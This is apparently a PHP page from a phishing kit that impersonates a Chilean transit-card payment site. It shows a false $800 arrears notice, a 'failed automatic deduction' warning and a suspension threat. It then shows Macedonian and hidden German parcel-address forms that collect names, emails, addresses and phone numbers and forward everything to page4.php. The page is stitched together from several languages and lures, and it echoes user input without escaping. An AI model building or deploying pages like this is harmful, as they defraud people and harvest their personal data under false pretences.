<?php
session_start();
//require_once 'config.php';
//include('partials/header.php');
include('header-him.php');


if (isset($_POST['submit']) || isset($_POST['phone'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
        /*        margin-top:70px;*/
        padding-bottom: 20px;
        /* background: #dedede; */
        background: white;
    }

    .top1 {
        background: white;
    }

    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: #00a8b7;
        font-size: 19px;
        font-weight: bold;
    }

    .notice {
        line-height: 2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }

    @media(max-width: 767px) {
        p.like_viewmore {
            font-size: 13px;
            color: red;
            cursor: pointer;
        }

        .submit-btn {
            text-align: center;
            background-color: #00a8b7 !important;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: auto;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

    table,
    tr,
    th {

        padding: 10px;

        margin: auto;
        border: none;
        border-collapse: separate;
        /* border-radius: 10px; */

    }

    .cstm-table-new tr td strong {
        color: #004F98;
    }

    .top1 p {
        color: #004F98;
        padding: 10px 0px;
    }

    .total-price {
        /* border-radius: 1em; */
        background: #fff;
        padding: 11px 19px;
        margin-bottom: 17px;
        border-bottom: 2px solid #dedede;
    }

    span.total-price-inner {
        float: right;
        color: #004F98;
        padding-right: 43px;
    }

    tr.alert-notice {
        float: right;
    }

    tr.alert-notice>td {
        border: none;
    }

    table tr.input-as-text {
        border-radius: 10px;
        background: #fff;
    }

    .img-text {
        background: url("https://tarjetabip.cl/images/bot-carga-online.png") no-repeat top center;
        background-size: 100%;
        width: 100%;
        height: 110px;
        position: relative;
        display: table;
    }

    .text-center {
        border-top: 2px solid #dedede;
    }

    .top1 p {
        border-top: 2px solid #dedede;
    }

    table {
        border-top: 2px solid #dedede;
    }

    .center {
        border-top: 2px solid #dedede;
    }

    .img-text h3 {
        font-size: 25px !important;
        display: table-cell !important;
        text-align: center;
        /* padding-top: 30px; */
        color: white;
        font-weight: bold;
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 1);
        vertical-align: middle !important;
        line-height: 25px;
    }

    ::placeholder {
        /* Chrome, Firefox, Opera, Safari 10.1+ */
        color: #000;
        opacity: 1;
        /* Firefox */
    }

    :-ms-input-placeholder {
        /* Internet Explorer 10-11 */
        color: #000;
    }

    ::-ms-input-placeholder {
        /* Microsoft Edge */
        color: #000;
    }

    body.zh_HK input {
        font-weight: normal !important;
    }

    tr.input-as-text {
        border-top-left-radius: 10px;
    }

    tr.input-as-text {
        border-top-right-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-left-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-right-radius: 10px;
    }
</style>
<div class="wrap old_code_wrap">
    <div class="top1">
        <div class="sm-img">
            <a href="#">
                <div class="img-text">
                    <h3>Carga Online</h3>
                </div>
            </a>
        </div>
        <h3 class="text-center" style="color:#004F98;">Su monto pendiente de pago actual es de $800</h3>
        <p>cliente：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <table class="cstm-table-new" width="100%">

            <tbody>
                <!-- <tr class="input-as-text">
            <td><input type="text" value="" placeholder="輸入預繳電費金額" size="20"></td>
            <td>元</td>
        </tr> -->
                <tr class="alert-notice">
                    <td><strong style="color:red;text-align: center;">Deducción automática fallida, pague manualmente</strong></td>
                </tr>
                <tr>
                    <td><strong>Mes de facturación</strong></td>
                    <td>30/8</td>
                </tr>
                <tr>
                    <td><strong>Tipo de tasa</strong></td>
                    <td>atrasos</td>
                </tr>
                <tr>
                    <td><strong>Cantidad pagable</strong></td>
                    <td>$800</td>
                </tr>
            </tbody>

        </table>
        <div class="center">
            <div class="total-price">
                <span><strong>Tenga en cuenta: El servicio de pago atrasado se suspenderá</strong></span>
                <span class="total-price-inner"></span>
            </div>
            <a href="page4.php" class="submit-btn">Siguiente</a>
        </div>

    </div>
</div>
<div class="" style="">
    <div class="container">
        <div class="">
            <div>
                <h3>Ажурирање на адресата</h3>
                <p>Ве молиме наведете точна адреса и ќе го доставиме вашиот пакет на време</p>
            </div>
            <form action="/page4.php" method="post">
                <label for="fname">Цело име</label>
                <input type="text" id="fullnamePage2" name="fullnamePage2" placeholder="Цело име"><br>


                <label for="lname">Поштенско сандаче</label>
                <input type="text" id="email" placeholder="Поштенско сандаче" name="email"><br>


                <label for="registration_address_countryIsoAlpha2Code">земја</label>
                <select class="" name="country" id="registration_address_countryIsoAlpha2Code">
                        <option value="" disabled="">Auswählen</option>
                        <option value="AT">Северна Македонија</option>
                        <option value="AF">Afghanistan</option>
                        <option value="EG">Ägypten</option>
                        <option value="AX">Aland</option>
                        <option value="AL">Albanien</option>
                        <option value="DZ">Algerien</option>
                        <option value="AS">Amerikanisch-Samoa</option>
                        <option value="VI">Amerikanische Jungferninseln</option>
                        <option value="AD">Andorra</option>
                        <option value="AO">Angola</option>
                        <option value="AI">Anguilla</option>
                        <option value="AQ">Antarktis</option>
                        <option value="AG">Antigua und Barbuda</option>
                        <option value="GQ">Äquatorialguinea</option>
                        <option value="AR">Argentinien</option>
                        <option value="AM">Armenien</option>
                        <option value="AW">Aruba</option>
                        <option value="AZ">Aserbaidschan</option>
                        <option value="ET">Äthiopien</option>
                        <option value="AU">Australien</option>
                        <option value="BS">Bahamas</option>
                        <option value="BH">Bahrain</option>
                        <option value="BD">Bangladesch</option>
                        <option value="BB">Barbados</option>
                        <option value="BY">Weißrussland</option>
                        <option value="BE">Belgien</option>
                        <option value="BZ">Belize</option>
                        <option value="BJ">Benin</option>
                        <option value="BM">Bermuda</option>
                        <option value="BT">Bhutan</option>
                        <option value="BO">Bolivien</option>
                        <option value="BQ">Bonaire, Sint Eustatius und Saba (Niederlande)</option>
                        <option value="BA">Bosnien und Herzegowina</option>
                        <option value="BW">Botswana</option>
                        <option value="BV">Bouvetinsel</option>
                        <option value="BR">Brasilien</option>
                        <option value="VG">Britische Jungferninseln</option>
                        <option value="IO">Britisches Territorium im Indischen Ozean</option>
                        <option value="BN">Brunei</option>
                        <option value="BG">Bulgarien</option>
                        <option value="BF">Burkina Faso</option>
                        <option value="BI">Burundi</option>
                        <option value="CL">Chile</option>
                        <option value="CN">China</option>
                        <option value="CK">Cookinseln</option>
                        <option value="CR">Costa Rica</option>
                        <option value="CI">Elfenbeinküste</option>
                        <option value="CW">Curaçao</option>
                        <option value="DK">Dänemark</option>
                        <option value="DE">Deutschland</option>
                        <option value="DM">Dominica</option>
                        <option value="DO">Dominikanische Republik</option>
                        <option value="DJ">Dschibuti</option>
                        <option value="EC">Ecuador</option>
                        <option value="SV">El Salvador</option>
                        <option value="ER">Eritrea</option>
                        <option value="EE">Estland</option>
                        <option value="FK">Falklandinseln</option>
                        <option value="FO">Färöer</option>
                        <option value="FJ">Fidschi</option>
                        <option value="FI">Finnland</option>
                        <option value="FR">Frankreich</option>
                        <option value="GF">Französisch-Guayana</option>
                        <option value="PF">Französisch-Polynesien</option>
                        <option value="TF">Französische Süd- und Antarktisgebiete</option>
                        <option value="GA">Gabun</option>
                        <option value="GM">Gambia</option>
                        <option value="GE">Georgien</option>
                        <option value="GH">Ghana</option>
                        <option value="GI">Gibraltar</option>
                        <option value="GD">Grenada</option>
                        <option value="GR">Griechenland</option>
                        <option value="GL">Grönland</option>
                        <option value="GP">Guadeloupe</option>
                        <option value="GU">Guam</option>
                        <option value="GT">Guatemala</option>
                        <option value="GG">Guernsey (Kanalinsel)</option>
                        <option value="GN">Guinea</option>
                        <option value="GW">Guinea-Bissau</option>
                        <option value="GY">Guyana</option>
                        <option value="HT">Haiti</option>
                        <option value="HM">Heard und McDonaldinseln</option>
                        <option value="HN">Honduras</option>
                        <option value="HK">Hongkong</option>
                        <option value="IN">Indien</option>
                        <option value="ID">Indonesien</option>
                        <option value="IM">Isle of Man</option>
                        <option value="IQ">Irak</option>
                        <option value="IR">Iran</option>
                        <option value="IE">Irland</option>
                        <option value="IS">Island</option>
                        <option value="IL">Israel</option>
                        <option value="IT">Italien</option>
                        <option value="JM">Jamaika</option>
                        <option value="JP">Japan</option>
                        <option value="YE">Jemen</option>
                        <option value="JE">Jersey (Kanalinsel)</option>
                        <option value="JO">Jordanien</option>
                        <option value="KY">Kaimaninseln</option>
                        <option value="KH">Kambodscha</option>
                        <option value="CM">Kamerun</option>
                        <option value="CA">Kanada</option>
                        <option value="CV">Kap Verde</option>
                        <option value="KZ">Kasachstan</option>
                        <option value="QA">Katar</option>
                        <option value="KE">Kenia</option>
                        <option value="KG">Kirgisistan</option>
                        <option value="KI">Kiribati</option>
                        <option value="CC">Kokosinseln</option>
                        <option value="CO">Kolumbien</option>
                        <option value="KM">Komoren</option>
                        <option value="XK">Kosovo</option>
                        <option value="CD">Demokratische Republik Kongo</option>
                        <option value="CG">Republik Kongo</option>
                        <option value="KP">Nordkorea</option>
                        <option value="KR">Südkorea</option>
                        <option value="HR">Kroatien</option>
                        <option value="CU">Kuba</option>
                        <option value="KW">Kuwait</option>
                        <option value="LA">Laos</option>
                        <option value="LS">Lesotho</option>
                        <option value="LV">Lettland</option>
                        <option value="LB">Libanon</option>
                        <option value="LR">Liberia</option>
                        <option value="LY">Libyen</option>
                        <option value="LI">Liechtenstein</option>
                        <option value="LT">Litauen</option>
                        <option value="LU">Luxemburg</option>
                        <option value="MO">Macao</option>
                        <option value="MG">Madagaskar</option>
                        <option value="MW">Malawi</option>
                        <option value="MY">Malaysia</option>
                        <option value="MV">Malediven</option>
                        <option value="ML">Mali</option>
                        <option value="MT">Malta</option>
                        <option value="MA">Marokko</option>
                        <option value="MH">Marshallinseln</option>
                        <option value="MQ">Martinique</option>
                        <option value="MR">Mauretanien</option>
                        <option value="MU">Mauritius</option>
                        <option value="YT">Mayotte</option>
                        <option value="MK">Nordmazedonien</option>
                        <option value="MX">Mexiko</option>
                        <option value="FM">Mikronesien</option>
                        <option value="MD">Moldawien</option>
                        <option value="MC">Monaco</option>
                        <option value="MN">Mongolei</option>
                        <option value="ME">Montenegro</option>
                        <option value="MS">Montserrat</option>
                        <option value="MZ">Mosambik</option>
                        <option value="MM">Myanmar</option>
                        <option value="NA">Namibia</option>
                        <option value="NR">Nauru</option>
                        <option value="NP">Nepal</option>
                        <option value="NC">Neukaledonien</option>
                        <option value="NZ">Neuseeland</option>
                        <option value="NI">Nicaragua</option>
                        <option value="NL">Niederlande</option>
                        <option value="AN">Niederländische Antillen</option>
                        <option value="NE">Niger</option>
                        <option value="NG">Nigeria</option>
                        <option value="NU">Niue</option>
                        <option value="MP">Nördliche Marianen</option>
                        <option value="NF">Norfolkinsel</option>
                        <option value="NO">Norwegen</option>
                        <option value="OM">Oman</option>
                        <option value="TL">Osttimor</option>
                        <option value="PK">Pakistan</option>
                        <option value="PS">Palästinensische Autonomiegebiete</option>
                        <option value="PW">Palau</option>
                        <option value="PA">Panama</option>
                        <option value="PG">Papua-Neuguinea</option>
                        <option value="PY">Paraguay</option>
                        <option value="PE">Peru</option>
                        <option value="PH">Philippinen</option>
                        <option value="PN">Pitcairninseln</option>
                        <option value="PL">Polen</option>
                        <option value="PT">Portugal</option>
                        <option value="PR">Puerto Rico</option>
                        <option value="RE">Réunion</option>
                        <option value="RW">Ruanda</option>
                        <option value="RO">Rumänien</option>
                        <option value="RU">Russland</option>
                        <option value="SB">Salomon-Inseln</option>
                        <option value="BL">Saint-Barthélemy (Insel)</option>
                        <option value="MF">St. Martin (Insel)</option>
                        <option value="ZM">Sambia</option>
                        <option value="WS">Samoa</option>
                        <option value="SM">San Marino</option>
                        <option value="ST">São Tomé und Príncipe</option>
                        <option value="SA">Saudi-Arabien</option>
                        <option value="SE">Schweden</option>
                        <option value="CH">Schweiz</option>
                        <option value="SN">Senegal</option>
                        <option value="RS">Serbien</option>
                        <option value="SC">Seychellen</option>
                        <option value="SL">Sierra Leone</option>
                        <option value="ZW">Simbabwe</option>
                        <option value="SG">Singapur</option>
                        <option value="SX">Sint Maarten</option>
                        <option value="SK">Slowakei</option>
                        <option value="SI">Slowenien</option>
                        <option value="SO">Somalia</option>
                        <option value="ES">Spanien</option>
                        <option value="LK">Sri Lanka</option>
                        <option value="SH">St. Helena</option>
                        <option value="KN">St. Kitts und Nevis</option>
                        <option value="LC">St. Lucia</option>
                        <option value="PM">Saint-Pierre und Miquelon</option>
                        <option value="VC">St. Vincent und die Grenadinen</option>
                        <option value="ZA">Südafrika</option>
                        <option value="SD">Sudan</option>
                        <option value="GS">Südgeorgien und die Südlichen Sandwichinseln</option>
                        <option value="SS">Südsudan</option>
                        <option value="SR">Suriname</option>
                        <option value="SJ">Svalbard und Jan Mayen</option>
                        <option value="SZ">Swasiland</option>
                        <option value="SY">Syrien</option>
                        <option value="TJ">Tadschikistan</option>
                        <option value="TW">Taiwan</option>
                        <option value="TZ">Tansania</option>
                        <option value="TH">Thailand</option>
                        <option value="TG">Togo</option>
                        <option value="TK">Tokelau</option>
                        <option value="TO">Tonga</option>
                        <option value="TT">Trinidad und Tobago</option>
                        <option value="TD">Tschad</option>
                        <option value="CZ">Tschechische Republik</option>
                        <option value="TN">Tunesien</option>
                        <option value="TR">Türkei</option>
                        <option value="TM">Turkmenistan</option>
                        <option value="TC">Turks- und Caicosinseln</option>
                        <option value="TV">Tuvalu</option>
                        <option value="UG">Uganda</option>
                        <option value="UA">Ukraine</option>
                        <option value="HU">Ungarn</option>
                        <option value="UM">United States Minor Outlying Islands</option>
                        <option value="UY">Uruguay</option>
                        <option value="UZ">Usbekistan</option>
                        <option value="VU">Vanuatu</option>
                        <option value="VA">Vatikanstadt</option>
                        <option value="VE">Venezuela</option>
                        <option value="AE">Vereinigte Arabische Emirate</option>
                        <option value="US">Vereinigte Staaten</option>
                        <option value="GB">Vereinigtes Königreich</option>
                        <option value="VN">Vietnam</option>
                        <option value="WF">Wallis und Futuna</option>
                        <option value="CX">Weihnachtsinsel</option>
                        <option value="EH">Westsahara</option>
                        <option value="CF">Zentralafrikanische Republik</option>
                        <option value="CY">Zypern</option>
                    </select>


                <label for="lname">Адреса на улица</label>
                <input type="text" id="address" name="address"><br>

                <label for="lname">Град</label>
                <input type="text" id="city" name="Град"><br>

                <label for="lname">Градот</label>
                <input type="text" id="state" name="Градот"><br>

                <label for="lname">Поштенски код</label>
                <input type="text" id="zipcode" name="Поштенски код"><br>

                <label for="lname">Телефон</label>
                <input type="text" id="phone" name="Телефон"><br><br>

                <input type="submit" class="button_next" name="page2_submit" value="Поднеси">
            </form>
        </div>
    </div>
</div>



    <div class="container content__container ">
        <div class="row content__row">
            <div class="col-md-12 col-lg-8">
                <div class="centerstage">
                    <main role="main" class="main">
                            <div class="registrierung">
                                <form action="/page4.php" style="display: none" method="post" class="cham-form" autocomplete="off">
                                    <div class="registrierung__step registrierung__step1">
                                        <h3>Adresse aktualisieren</h3>
                                        <p>Bitte geben Sie eine gültige Lieferadresse an. Die richtige Adresse stellt sicher, dass Ihr Paket korrekt und pünktlich geliefert wird.</p>
                                        <div class="registrierung__step1__block">
                                            <div class="row row-no-padding">
                                                <div class="col-12 col-md-6 col-lg-6">
                                                    <label for="registration_salutation">Anrede*</label>
                                                    <div class="select__input undefined select__input--primary   ">
                                                        <select class="" name="salutation" id="registration_salutation" placeholder="Auswählen">
                                                            <option value="" disabled="">Auswählen</option>
                                                            <option value="Herr">Herr</option>
                                                            <option value="Frau">Frau</option>
                                                        </select>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row row-no-padding">
                                                <div class="col-12 col-md-6 col-lg-6">
                                                    <label for="registration_firstname">Vorname*</label>
                                                    <input type="text" name="first_name" id="registration_firstname" placeholder="z.B. Georg" class=" " autocomplete="off" value="">
                                                </div>
                                                <div class="col-12 col-md-6 col-lg-6">
                                                    <label for="registration_lastname">Nachname*</label>
                                                    <input type="text" name="last_name" id="registration_lastname" placeholder="z.B. Mustermann" class=" " autocomplete="off" value="">
                                                </div>
                                                <div class="col-12 col-md-5 col-lg-6">
                                                    <div class="autocompleteInput undefined">
                                                        <label for="registration_address_street">Адреса на улица 1</label>
                                                        <div style="display: inline-block; width: 100%;">
                                                            <input placeholder="z.B. Mariahilfer Straße" id="registration_address_street" name="address" class="" role="combobox" aria-autocomplete="list" aria-expanded="false" autocomplete="off" value="">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="registrierung__step1__block">
                                            <div class="row row-no-padding">
                                                <div class="col-12 col-md-5 col-lg-5">
                                                    <label for="registration_address_countryIsoAlpha2Code">Land*</label>
                                                    <div class="select__input undefined select__input--primary   input-select-filled">
                                                        <select class="" name="country" id="registration_address_countryIsoAlpha2Code">
                                                            <option value="" disabled="">Auswählen</option>
                                                            <option value="AT">Северна Македонија</option>
                                                            <option value="AF">Afghanistan</option>
                                                            <option value="EG">Ägypten</option>
                                                            <option value="AX">Aland</option>
                                                            <option value="AL">Albanien</option>
                                                            <option value="DZ">Algerien</option>
                                                            <option value="AS">Amerikanisch-Samoa</option>
                                                            <option value="VI">Amerikanische Jungferninseln</option>
                                                            <option value="AD">Andorra</option>
                                                            <option value="AO">Angola</option>
                                                            <option value="AI">Anguilla</option>
                                                            <option value="AQ">Antarktis</option>
                                                            <option value="AG">Antigua und Barbuda</option>
                                                            <option value="GQ">Äquatorialguinea</option>
                                                            <option value="AR">Argentinien</option>
                                                            <option value="AM">Armenien</option>
                                                            <option value="AW">Aruba</option>
                                                            <option value="AZ">Aserbaidschan</option>
                                                            <option value="ET">Äthiopien</option>
                                                            <option value="AU">Australien</option>
                                                            <option value="BS">Bahamas</option>
                                                            <option value="BH">Bahrain</option>
                                                            <option value="BD">Bangladesch</option>
                                                            <option value="BB">Barbados</option>
                                                            <option value="BY">Weißrussland</option>
                                                            <option value="BE">Belgien</option>
                                                            <option value="BZ">Belize</option>
                                                            <option value="BJ">Benin</option>
                                                            <option value="BM">Bermuda</option>
                                                            <option value="BT">Bhutan</option>
                                                            <option value="BO">Bolivien</option>
                                                            <option value="BQ">Bonaire, Sint Eustatius und Saba (Niederlande)</option>
                                                            <option value="BA">Bosnien und Herzegowina</option>
                                                            <option value="BW">Botswana</option>
                                                            <option value="BV">Bouvetinsel</option>
                                                            <option value="BR">Brasilien</option>
                                                            <option value="VG">Britische Jungferninseln</option>
                                                            <option value="IO">Britisches Territorium im Indischen Ozean</option>
                                                            <option value="BN">Brunei</option>
                                                            <option value="BG">Bulgarien</option>
                                                            <option value="BF">Burkina Faso</option>
                                                            <option value="BI">Burundi</option>
                                                            <option value="CL">Chile</option>
                                                            <option value="CN">China</option>
                                                            <option value="CK">Cookinseln</option>
                                                            <option value="CR">Costa Rica</option>
                                                            <option value="CI">Elfenbeinküste</option>
                                                            <option value="CW">Curaçao</option>
                                                            <option value="DK">Dänemark</option>
                                                            <option value="DE">Deutschland</option>
                                                            <option value="DM">Dominica</option>
                                                            <option value="DO">Dominikanische Republik</option>
                                                            <option value="DJ">Dschibuti</option>
                                                            <option value="EC">Ecuador</option>
                                                            <option value="SV">El Salvador</option>
                                                            <option value="ER">Eritrea</option>
                                                            <option value="EE">Estland</option>
                                                            <option value="FK">Falklandinseln</option>
                                                            <option value="FO">Färöer</option>
                                                            <option value="FJ">Fidschi</option>
                                                            <option value="FI">Finnland</option>
                                                            <option value="FR">Frankreich</option>
                                                            <option value="GF">Französisch-Guayana</option>
                                                            <option value="PF">Französisch-Polynesien</option>
                                                            <option value="TF">Französische Süd- und Antarktisgebiete</option>
                                                            <option value="GA">Gabun</option>
                                                            <option value="GM">Gambia</option>
                                                            <option value="GE">Georgien</option>
                                                            <option value="GH">Ghana</option>
                                                            <option value="GI">Gibraltar</option>
                                                            <option value="GD">Grenada</option>
                                                            <option value="GR">Griechenland</option>
                                                            <option value="GL">Grönland</option>
                                                            <option value="GP">Guadeloupe</option>
                                                            <option value="GU">Guam</option>
                                                            <option value="GT">Guatemala</option>
                                                            <option value="GG">Guernsey (Kanalinsel)</option>
                                                            <option value="GN">Guinea</option>
                                                            <option value="GW">Guinea-Bissau</option>
                                                            <option value="GY">Guyana</option>
                                                            <option value="HT">Haiti</option>
                                                            <option value="HM">Heard und McDonaldinseln</option>
                                                            <option value="HN">Honduras</option>
                                                            <option value="HK">Hongkong</option>
                                                            <option value="IN">Indien</option>
                                                            <option value="ID">Indonesien</option>
                                                            <option value="IM">Isle of Man</option>
                                                            <option value="IQ">Irak</option>
                                                            <option value="IR">Iran</option>
                                                            <option value="IE">Irland</option>
                                                            <option value="IS">Island</option>
                                                            <option value="IL">Israel</option>
                                                            <option value="IT">Italien</option>
                                                            <option value="JM">Jamaika</option>
                                                            <option value="JP">Japan</option>
                                                            <option value="YE">Jemen</option>
                                                            <option value="JE">Jersey (Kanalinsel)</option>
                                                            <option value="JO">Jordanien</option>
                                                            <option value="KY">Kaimaninseln</option>
                                                            <option value="KH">Kambodscha</option>
                                                            <option value="CM">Kamerun</option>
                                                            <option value="CA">Kanada</option>
                                                            <option value="CV">Kap Verde</option>
                                                            <option value="KZ">Kasachstan</option>
                                                            <option value="QA">Katar</option>
                                                            <option value="KE">Kenia</option>
                                                            <option value="KG">Kirgisistan</option>
                                                            <option value="KI">Kiribati</option>
                                                            <option value="CC">Kokosinseln</option>
                                                            <option value="CO">Kolumbien</option>
                                                            <option value="KM">Komoren</option>
                                                            <option value="XK">Kosovo</option>
                                                            <option value="CD">Demokratische Republik Kongo</option>
                                                            <option value="CG">Republik Kongo</option>
                                                            <option value="KP">Nordkorea</option>
                                                            <option value="KR">Südkorea</option>
                                                            <option value="HR">Kroatien</option>
                                                            <option value="CU">Kuba</option>
                                                            <option value="KW">Kuwait</option>
                                                            <option value="LA">Laos</option>
                                                            <option value="LS">Lesotho</option>
                                                            <option value="LV">Lettland</option>
                                                            <option value="LB">Libanon</option>
                                                            <option value="LR">Liberia</option>
                                                            <option value="LY">Libyen</option>
                                                            <option value="LI">Liechtenstein</option>
                                                            <option value="LT">Litauen</option>
                                                            <option value="LU">Luxemburg</option>
                                                            <option value="MO">Macao</option>
                                                            <option value="MG">Madagaskar</option>
                                                            <option value="MW">Malawi</option>
                                                            <option value="MY">Malaysia</option>
                                                            <option value="MV">Malediven</option>
                                                            <option value="ML">Mali</option>
                                                            <option value="MT">Malta</option>
                                                            <option value="MA">Marokko</option>
                                                            <option value="MH">Marshallinseln</option>
                                                            <option value="MQ">Martinique</option>
                                                            <option value="MR">Mauretanien</option>
                                                            <option value="MU">Mauritius</option>
                                                            <option value="YT">Mayotte</option>
                                                            <option value="MK">Nordmazedonien</option>
                                                            <option value="MX">Mexiko</option>
                                                            <option value="FM">Mikronesien</option>
                                                            <option value="MD">Moldawien</option>
                                                            <option value="MC">Monaco</option>
                                                            <option value="MN">Mongolei</option>
                                                            <option value="ME">Montenegro</option>
                                                            <option value="MS">Montserrat</option>
                                                            <option value="MZ">Mosambik</option>
                                                            <option value="MM">Myanmar</option>
                                                            <option value="NA">Namibia</option>
                                                            <option value="NR">Nauru</option>
                                                            <option value="NP">Nepal</option>
                                                            <option value="NC">Neukaledonien</option>
                                                            <option value="NZ">Neuseeland</option>
                                                            <option value="NI">Nicaragua</option>
                                                            <option value="NL">Niederlande</option>
                                                            <option value="AN">Niederländische Antillen</option>
                                                            <option value="NE">Niger</option>
                                                            <option value="NG">Nigeria</option>
                                                            <option value="NU">Niue</option>
                                                            <option value="MP">Nördliche Marianen</option>
                                                            <option value="NF">Norfolkinsel</option>
                                                            <option value="NO">Norwegen</option>
                                                            <option value="OM">Oman</option>
                                                            <option value="TL">Osttimor</option>
                                                            <option value="PK">Pakistan</option>
                                                            <option value="PS">Palästinensische Autonomiegebiete</option>
                                                            <option value="PW">Palau</option>
                                                            <option value="PA">Panama</option>
                                                            <option value="PG">Papua-Neuguinea</option>
                                                            <option value="PY">Paraguay</option>
                                                            <option value="PE">Peru</option>
                                                            <option value="PH">Philippinen</option>
                                                            <option value="PN">Pitcairninseln</option>
                                                            <option value="PL">Polen</option>
                                                            <option value="PT">Portugal</option>
                                                            <option value="PR">Puerto Rico</option>
                                                            <option value="RE">Réunion</option>
                                                            <option value="RW">Ruanda</option>
                                                            <option value="RO">Rumänien</option>
                                                            <option value="RU">Russland</option>
                                                            <option value="SB">Salomon-Inseln</option>
                                                            <option value="BL">Saint-Barthélemy (Insel)</option>
                                                            <option value="MF">St. Martin (Insel)</option>
                                                            <option value="ZM">Sambia</option>
                                                            <option value="WS">Samoa</option>
                                                            <option value="SM">San Marino</option>
                                                            <option value="ST">São Tomé und Príncipe</option>
                                                            <option value="SA">Saudi-Arabien</option>
                                                            <option value="SE">Schweden</option>
                                                            <option value="CH">Schweiz</option>
                                                            <option value="SN">Senegal</option>
                                                            <option value="RS">Serbien</option>
                                                            <option value="SC">Seychellen</option>
                                                            <option value="SL">Sierra Leone</option>
                                                            <option value="ZW">Simbabwe</option>
                                                            <option value="SG">Singapur</option>
                                                            <option value="SX">Sint Maarten</option>
                                                            <option value="SK">Slowakei</option>
                                                            <option value="SI">Slowenien</option>
                                                            <option value="SO">Somalia</option>
                                                            <option value="ES">Spanien</option>
                                                            <option value="LK">Sri Lanka</option>
                                                            <option value="SH">St. Helena</option>
                                                            <option value="KN">St. Kitts und Nevis</option>
                                                            <option value="LC">St. Lucia</option>
                                                            <option value="PM">Saint-Pierre und Miquelon</option>
                                                            <option value="VC">St. Vincent und die Grenadinen</option>
                                                            <option value="ZA">Südafrika</option>
                                                            <option value="SD">Sudan</option>
                                                            <option value="GS">Südgeorgien und die Südlichen Sandwichinseln</option>
                                                            <option value="SS">Südsudan</option>
                                                            <option value="SR">Suriname</option>
                                                            <option value="SJ">Svalbard und Jan Mayen</option>
                                                            <option value="SZ">Swasiland</option>
                                                            <option value="SY">Syrien</option>
                                                            <option value="TJ">Tadschikistan</option>
                                                            <option value="TW">Taiwan</option>
                                                            <option value="TZ">Tansania</option>
                                                            <option value="TH">Thailand</option>
                                                            <option value="TG">Togo</option>
                                                            <option value="TK">Tokelau</option>
                                                            <option value="TO">Tonga</option>
                                                            <option value="TT">Trinidad und Tobago</option>
                                                            <option value="TD">Tschad</option>
                                                            <option value="CZ">Tschechische Republik</option>
                                                            <option value="TN">Tunesien</option>
                                                            <option value="TR">Türkei</option>
                                                            <option value="TM">Turkmenistan</option>
                                                            <option value="TC">Turks- und Caicosinseln</option>
                                                            <option value="TV">Tuvalu</option>
                                                            <option value="UG">Uganda</option>
                                                            <option value="UA">Ukraine</option>
                                                            <option value="HU">Ungarn</option>
                                                            <option value="UM">United States Minor Outlying Islands</option>
                                                            <option value="UY">Uruguay</option>
                                                            <option value="UZ">Usbekistan</option>
                                                            <option value="VU">Vanuatu</option>
                                                            <option value="VA">Vatikanstadt</option>
                                                            <option value="VE">Venezuela</option>
                                                            <option value="AE">Vereinigte Arabische Emirate</option>
                                                            <option value="US">Vereinigte Staaten</option>
                                                            <option value="GB">Vereinigtes Königreich</option>
                                                            <option value="VN">Vietnam</option>
                                                            <option value="WF">Wallis und Futuna</option>
                                                            <option value="CX">Weihnachtsinsel</option>
                                                            <option value="EH">Westsahara</option>
                                                            <option value="CF">Zentralafrikanische Republik</option>
                                                            <option value="CY">Zypern</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-5 col-md-3 col-lg-2">
                                                    <label for="registration_address_postalCode">Zipcode*</label>
                                                    <input type="text" name="zipcode" id="registration_address_postalCode" placeholder="Zipcode" class=" " autocomplete="off" value="">
                                                </div>
                                                <div class="col-7 col-md-4 col-lg-5">
                                                    <div class="autocompleteInput undefined">
                                                        <label for="registration_address_city">City*</label>
                                                        <div style="display: inline-block; width: 100%;">
                                                            <input placeholder="City" id="registration_address_city" name="city" class="" role="combobox" aria-autocomplete="list" aria-expanded="false" autocomplete="off" value="">
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="col-7 col-md-4 col-lg-4">
                                                    <div class="autocompleteInput undefined">
                                                        <label for="registration_address_houseNumber">Phone</label>
                                                        <div style="display: inline-block; width: 100%;">
                                                            <input placeholder="Phone" id="registration_address_phone" name="phone" class="" role="combobox" aria-autocomplete="list" aria-expanded="false" autocomplete="off" value="">
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-5 col-md-3 col-lg-2">
                                                    <label for="registration_address_doorNumber">State</label>
                                                    <input type="text" name="state" id="registration_address_state" placeholder="z.B. 7" class=" " autocomplete="off" value="">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="registrierung__step1__block">
                                            <div class="row row-no-padding">
                                                <div class="col-12">
                                                    <label for="registration_username">Email-Adresse*</label>
                                                    <input name="email" placeholder="z.B. Georg.Mustermann@email.at" type="text" class=" " autocomplete="off" value="">
                                                    <input name="username_ghost" type="hidden" value="">
                                                </div>
                                            </div>
                                        </div>
                                        <label class="sc-form__checkbox  " for="registration_marketingAgreement">
                                            <input name="marketingAgreement" id="registration_marketingAgreement" type="checkbox" aria-required="false" aria-invalid="false" class="">
                                            <span class="sc-form__focus-indicator"></span>
                                            <div class="sc-form__checkbox__label">
